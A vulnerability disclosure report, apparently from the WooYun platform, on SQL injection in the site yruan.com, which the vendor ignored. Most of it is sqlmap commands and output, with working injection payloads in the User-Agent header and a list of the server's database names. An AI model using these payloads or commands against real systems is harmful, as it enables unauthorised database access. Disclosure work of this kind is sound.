wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-10-30：	细节已通知厂商并且等待厂商处理中									2013-11-04：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看他们上一个的漏洞的时候发现代码写的有问题，就再测试一下sql注入了 详细说明：  
./sqlmap.py -u yruan.com --current-db --current-user    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:54:12[11:54:12] [INFO] resuming back-end DBMS 'mysql'[11:54:12] [INFO] testing connection to the target URL[11:54:12] [INFO] heuristics detected web page charset 'utf-8'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: User-AgentParameter: User-Agent    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sqlmap/1.0-dev (http://sqlmap.org)' AND 3804=3804 AND 'BwuL'='BwuL    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: sqlmap/1.0-dev (http://sqlmap.org)' AND (SELECT 3796 FROM(SELECT COUNT(*),CONCAT(0x716c647371,(SELECT (CASE WHEN (3796=3796) THEN 1 ELSE 0 END)),0x71777a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'jcPH'='jcPH---[11:54:12] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.11, Nginxback-end DBMS: MySQL 5.0[11:54:12] [INFO] fetching current user[11:54:12] [WARNING] reflective value(s) found and filtering out[11:54:12] [INFO] retrieved: yruan@localhostcurrent user:    'yruan@localhost'[11:54:12] [INFO] fetching current database[11:54:12] [INFO] retrieved: yruancurrent database:    'yruan'

./sqlmap.py -u yruan.com --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:51:44[11:51:44] [INFO] resuming back-end DBMS 'mysql'[11:51:45] [INFO] testing connection to the target URL[11:51:45] [INFO] heuristics detected web page charset 'utf-8'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: User-AgentParameter: User-Agent    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sqlmap/1.0-dev (http://sqlmap.org)' AND 3804=3804 AND 'BwuL'='BwuL    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: sqlmap/1.0-dev (http://sqlmap.org)' AND (SELECT 3796 FROM(SELECT COUNT(*),CONCAT(0x716c647371,(SELECT (CASE WHEN (3796=3796) THEN 1 ELSE 0 END)),0x71777a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'jcPH'='jcPH---[11:51:45] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.11, Nginxback-end DBMS: MySQL 5.0[11:51:45] [INFO] fetching database names[11:51:45] [WARNING] reflective value(s) found and filtering out[11:51:45] [INFO] the SQL query used returns 20 entries[11:51:45] [INFO] retrieved: information_schema[11:51:46] [INFO] retrieved: 3cpt[11:51:47] [INFO] retrieved: cacti[11:51:47] [INFO] retrieved: jihome[11:51:48] [INFO] retrieved: lenses[11:51:48] [INFO] retrieved: lenses_test[11:51:48] [INFO] retrieved: lixi[11:51:48] [INFO] retrieved: mysql[11:51:48] [INFO] retrieved: odatas[11:51:49] [INFO] retrieved: paogamev2[11:51:50] [INFO] retrieved: phpcms1[11:51:50] [INFO] retrieved: sq_jipeng[11:51:50] [INFO] retrieved: supesite[11:51:50] [INFO] retrieved: tangwenming[11:51:50] [INFO] retrieved: teagirl[11:51:50] [INFO] retrieved: ucenter[11:51:51] [INFO] retrieved: wp_jihome[11:51:51] [INFO] retrieved: yruan[11:51:51] [INFO] retrieved: yruan2[11:51:51] [INFO] retrieved: zapk
